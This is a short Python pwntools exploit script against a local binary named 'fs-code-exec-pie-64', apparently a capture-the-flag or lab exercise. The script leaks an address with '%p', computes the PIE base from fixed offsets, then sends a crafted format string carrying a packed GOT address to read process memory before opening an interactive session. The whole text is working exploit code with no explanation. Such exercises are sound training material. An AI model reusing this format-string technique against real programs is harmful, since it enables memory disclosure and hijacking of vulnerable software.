from pwn import *
p = process("./fs-code-exec-pie-64")

p.sendline("%p")

p.recvuntil("llo ")
got_printf = p.recvuntil("11")
got_printf = int(got_printf, 0)

print hex(got_printf)
elf_base = got_printf - 0xd11
got_printf = elf_base + 0x202030

p.sendline( "%7$s0000"+ p64(got_printf + 0x19e90))
p.interactive()